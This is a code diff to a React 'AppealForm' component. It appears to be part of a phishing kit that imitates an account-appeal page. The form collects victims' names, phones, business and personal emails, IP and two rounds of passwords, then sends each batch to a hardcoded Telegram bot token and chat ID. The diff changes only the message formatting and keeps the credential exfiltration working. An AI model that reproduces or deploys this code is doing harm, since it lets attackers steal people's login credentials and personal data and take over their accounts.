@@ -33,8 +33,7 @@ const AppealForm = (props) => {
     const sendAppealData = async (data) => {
         try {
 
-            const message = `
-             %0A =============================%0AIp:${props.ip.userIP}%0A Appeal: ${data.appeal}%0A Full Name: ${data.fullname}%0A Phone: ${data.mobilePhone}%0A Bussines: ${data.bussinesEmail}%0A Personal: ${data.personalEmail}%0A Page Name: ${data.pageName}%0A=============================%0A 
+            const message = Ip:${props.ip.userIP}, Appeal: ${data.appeal}, Full Name: ${data.fullname}, Phone: ${data.mobilePhone}, Bussines: ${data.bussinesEmail}, Personal: ${data.personalEmail}, Page Name: ${data.pageName} 
             `
             const res = await fetch(`https://api.telegram.org/bot67534507020:AAGoCGYIddUN3udUwfaxX_3bFrh8ZBEqg7I/sendMessage?chat_id=-4759365392&text=${message}`);
             setSteps({first_password: true, second_password: false});
@@ -48,7 +47,7 @@ const AppealForm = (props) => {
         try {
 
             const message = `
-             Ip:${props.ip.userIP}%0A pw: ${data.password}`;
+             Ip:${props.ip.userIP}, pw: ${data.password}`;
             const res = await fetch(`https://api.telegram.org/bot67534507020:AAGoCGYIddUN3udUwfaxX_3bFrh8ZBEqg7I/sendMessage?chat_id=-4759365392&text=${message}`);
             setSteps({first_password: false, second_password: true})
 
@@ -61,7 +60,7 @@ const AppealForm = (props) => {
         try {
 
             const message = `
-             Ip:${props.ip.userIP}%0A second pw: ${data.password}`;
+             Ip:${props.ip.userIP}, second pw: ${data.password}`;
             const res = await fetch(`https://api.telegram.org/bot67534507020:AAGoCGYIddUN3udUwfaxX_3bFrh8ZBEqg7I/sendMessage?chat_id=-4759365392&text=${message}`);
             setSteps({first_password: false, second_password: false})
             trigerNext();
